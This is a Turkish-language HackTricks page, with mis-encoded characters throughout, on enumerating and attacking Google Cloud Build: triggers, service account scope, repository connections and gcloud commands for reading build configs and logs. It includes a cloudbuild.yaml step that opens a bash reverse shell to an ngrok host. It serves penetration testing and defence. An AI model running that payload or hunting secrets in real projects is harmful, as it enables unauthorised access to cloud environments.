# GCP - Cloud Build Enum

{% hint style="success" %}
AWS Hacking Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live) **bizi takip edin.**
* **HackTricks'e PR gÃ¶ndererek hacking ipuÃ§larÄ±nÄ± paylaÅŸÄ±n** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na.

</details>
{% endhint %}

## Temel Bilgiler

Google Cloud Build, **yazÄ±lÄ±m oluÅŸturma** ve sÃ¼rÃ¼m sÃ¼reÃ§lerini otomatikleÅŸtiren, **kaynak kodu depolarÄ±** ile entegre olan ve geniÅŸ bir programlama dili yelpazesini destekleyen yÃ¶netilen bir CI/CD platformudur. **GeliÅŸtiricilerin kodu otomatik olarak oluÅŸturmasÄ±na, test etmesine ve daÄŸÄ±tmasÄ±na olanak tanÄ±r** ve yapÄ± adÄ±mlarÄ±nÄ± ve iÅŸ akÄ±ÅŸlarÄ±nÄ± Ã¶zelleÅŸtirme esnekliÄŸi saÄŸlar.

Her Cloud Build Trigger, **bir Cloud Repository ile iliÅŸkilidir veya doÄŸrudan harici bir depo ile baÄŸlantÄ±lÄ±dÄ±r** (Github, Bitbucket ve Gitlab).

{% hint style="success" %}
Buradan veya Cloud Repositories'den Github/Bitbucket token'Ä±nÄ± Ã§almanÄ±n bir yolunu gÃ¶remedim Ã§Ã¼nkÃ¼ depo indirildiÄŸinde [https://source.cloud.google.com/](https://source.cloud.google.com/) URL'si Ã¼zerinden eriÅŸiliyor ve Github istemci tarafÄ±ndan eriÅŸilmiyor.
{% endhint %}

### Olaylar

Cloud Build ÅŸu durumlarda tetiklenebilir:

* **Bir dala push**: DalÄ± belirtin
* **Yeni bir etiket push**: Etiketi belirtin
* **Pull request**: PR'yi alan dalÄ± belirtin
* **Manuel Ã‡aÄŸrÄ±**
* **Pub/Sub mesajÄ±:** Konuyu belirtin
* **Webhook olayÄ±**: Bir HTTPS URL'si aÃ§Ä±ÄŸa Ã§Ä±karacak ve istek bir gizli anahtar ile kimlik doÄŸrulamalÄ± olmalÄ±dÄ±r

### YÃ¼rÃ¼tme

3 seÃ§enek vardÄ±r:

* YÃ¼rÃ¼tÃ¼lecek komutlarÄ± **belirten bir yaml/json**. Genellikle: `/cloudbuild.yaml`
* Web konsolunda ve cli'de "inline" olarak belirtilebilen tek bir tane
* En yaygÄ±n seÃ§enek
* Kimlik doÄŸrulamasÄ± yapÄ±lmamÄ±ÅŸ eriÅŸim iÃ§in ilgili
* OluÅŸturulacak bir **Dockerfile**
* OluÅŸturulacak bir **Buildpack**

### SA Ä°zinleri

**Service Account `cloud-platform` kapsamÄ±na sahiptir**, bu nedenle **tÃ¼m ayrÄ±calÄ±klarÄ± kullanabilir.** EÄŸer **hiÃ§bir SA belirtilmemiÅŸse** (submit yaparken olduÄŸu gibi) **varsayÄ±lan SA** `<proj-number>@cloudbuild.gserviceaccount.com` **kullanÄ±lacaktÄ±r.**

VarsayÄ±lan olarak hiÃ§bir izin verilmez ancak bazÄ±larÄ±nÄ± vermek oldukÃ§a kolaydÄ±r:

<figure><img src="../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Onaylar

Bir Cloud Build'i **yapÄ± yÃ¼rÃ¼tmeleri iÃ§in onay gerektirecek ÅŸekilde yapÄ±landÄ±rmak** mÃ¼mkÃ¼ndÃ¼r (varsayÄ±lan olarak devre dÄ±ÅŸÄ±dÄ±r).

### PR OnaylarÄ±

Tetikleyici PR olduÄŸunda, Ã§Ã¼nkÃ¼ **herkes halka aÃ§Ä±k depolara PR yapabilir**, tetikleyicinin herhangi bir PR ile yÃ¼rÃ¼tÃ¼lmesine izin vermek Ã§ok tehlikeli olurdu. Bu nedenle, varsayÄ±lan olarak, yÃ¼rÃ¼tme **sadece sahipler ve iÅŸbirlikÃ§iler iÃ§in otomatik olacaktÄ±r** ve diÄŸer kullanÄ±cÄ±larÄ±n PR'leri ile tetikleyiciyi yÃ¼rÃ¼tmek iÃ§in bir sahip veya iÅŸbirlikÃ§i `/gcbrun` yorumunu yapmalÄ±dÄ±r.

<figure><img src="../../../.gitbook/assets/image (150).png" alt="" width="563"><figcaption></figcaption></figure>

### BaÄŸlantÄ±lar ve Depolar

BaÄŸlantÄ±lar ÅŸu ÅŸekilde oluÅŸturulabilir:

* **GitHub:** Bir **Github token'Ä± almak** iÃ§in izin isteyen bir OAuth istemi gÃ¶sterecek ve bu token **Secret Manager** iÃ§inde saklanacaktÄ±r.
* **GitHub Enterprise:** Bir **GithubApp** yÃ¼klemenizi isteyecek. GitHub Enterprise ana bilgisayarÄ±nÄ±zdan bir **kimlik doÄŸrulama token'Ä±** oluÅŸturulacak ve bu projede bir **Secret Manager** sÄ±rrÄ± olarak saklanacaktÄ±r.
* **GitLab / Enterprise:** **API eriÅŸim token'Ä±nÄ± ve Read API eriÅŸim token'Ä±nÄ± saÄŸlamanÄ±z** gerekecek ve bu **Secret Manager** iÃ§inde saklanacaktÄ±r.

Bir baÄŸlantÄ± oluÅŸturulduktan sonra, **Github hesabÄ±nÄ±n eriÅŸimi olan depolarÄ± baÄŸlamak** iÃ§in kullanÄ±labilir.

Bu seÃ§enek ÅŸu dÃ¼ÄŸme aracÄ±lÄ±ÄŸÄ±yla mevcuttur:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
Bu yÃ¶ntemle baÄŸlanan depolarÄ±n **yalnÄ±zca 2. nesil Triggers'da kullanÄ±labilir** olduÄŸunu unutmayÄ±n.
{% endhint %}

### Bir Depo BaÄŸlama

Bu, bir **`connection`** ile aynÄ± ÅŸey deÄŸildir. Bu, **Github veya Bitbucket** deposuna **eriÅŸim saÄŸlamak iÃ§in farklÄ± yollar** sunar ancak **bir baÄŸlantÄ± nesnesi oluÅŸturmaz, ancak bir depo nesnesi (1. nesil) oluÅŸturur.**

Bu seÃ§enek ÅŸu dÃ¼ÄŸme aracÄ±lÄ±ÄŸÄ±yla mevcuttur:

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Depolama

Bazen Cloud Build, **tetikleyici iÃ§in dosyalarÄ± depolamak Ã¼zere yeni bir depolama oluÅŸturacaktÄ±r.** Bu, Ã¶rneÄŸin GCP'nin sunduÄŸu Ã¶rnekte olduÄŸu gibi gerÃ§ekleÅŸir:
```bash
git clone https://github.com/GoogleCloudBuild/cloud-console-sample-build && \
cd cloud-console-sample-build && \
gcloud builds submit --config cloudbuild.yaml --region=global
```
Bir `.tgz` dosyasÄ±nÄ± kullanmak iÃ§in [security-devbox\_cloudbuild](https://console.cloud.google.com/storage/browser/security-devbox\_cloudbuild;tab=objects?forceOnBucketsSortingFiltering=false\&project=security-devbox) adlÄ± bir Storage bucket oluÅŸturulur.

### Shell Elde Etme
```yaml
steps:
- name: bash
script: |
#!/usr/bin/env bash
bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/12395 0>&1
options:
logging: CLOUD_LOGGING_ONLY
```
```markdown
cloud build iÃ§inde gcloud kur:
```
```bash
# https://stackoverflow.com/questions/28372328/how-to-install-the-google-cloud-sdk-in-a-docker-image
curl https://dl.google.com/dl/cloudsdk/release/google-cloud-sdk.tar.gz > /tmp/google-cloud-sdk.tar.gz
mkdir -p /usr/local/gcloud
tar -C /usr/local/gcloud -xvf /tmp/google-cloud-sdk.tar.gz
/usr/local/gcloud/google-cloud-sdk/install.sh
```
### Enumeration

YapÄ± yapÄ±landÄ±rmalarÄ±nda ve gÃ¼nlÃ¼klerde **hassas bilgi bulabilirsiniz**.
```bash
# Get configured triggers configurations
gcloud builds triggers list # Check for the words github and bitbucket
gcloud builds triggers describe <trigger-name>

# Get build executions
gcloud builds list
gcloud builds describe <build-uuid> # Get even the build yaml if defined in there
gcloud builds log <build-uuid> # Get build logs

# List all connections of each region
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build connections in region: $region"
connections=("${(@f)$(gcloud builds connections list --region="$region" --format='value(name)')}")
if [[ ${#connections[@]} -eq 0 ]]; then
echo "No connections found in region $region."
else
for connection in $connections; do
echo "Describing connection $connection in region $region"
gcloud builds connections describe "$connection" --region="$region"
echo "-----------------------------------------"
done
fi
echo "========================================="
done

# List all worker-pools
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build worker-pools in region: $region"
gcloud builds worker-pools list --region="$region"
echo "-----------------------------------------"
done
```
### AyrÄ±calÄ±k YÃ¼kseltme

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md" %}
[gcp-cloudbuild-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md)
{% endcontent-ref %}

### Kimlik DoÄŸrulamasÄ± Olmayan EriÅŸim

{% content-ref url="../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md" %}
[gcp-cloud-build-unauthenticated-enum.md](../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md)
{% endcontent-ref %}

### SÃ¶mÃ¼rÃ¼ SonrasÄ±

{% content-ref url="../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md" %}
[gcp-cloud-build-post-exploitation.md](../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md)
{% endcontent-ref %}

{% hint style="success" %}
AWS Hacking Ã¶ÄŸren ve pratik yap:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking Ã¶ÄŸren ve pratik yap: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekle</summary>

* [**Abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol et!
* **ğŸ’¬ Discord grubuna** [**katÄ±l**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±l ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'Ä± takip et.**
* **HackTricks'e PR gÃ¶ndererek hacking ipuÃ§larÄ±nÄ± paylaÅŸ** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na.

</details>
{% endhint %}
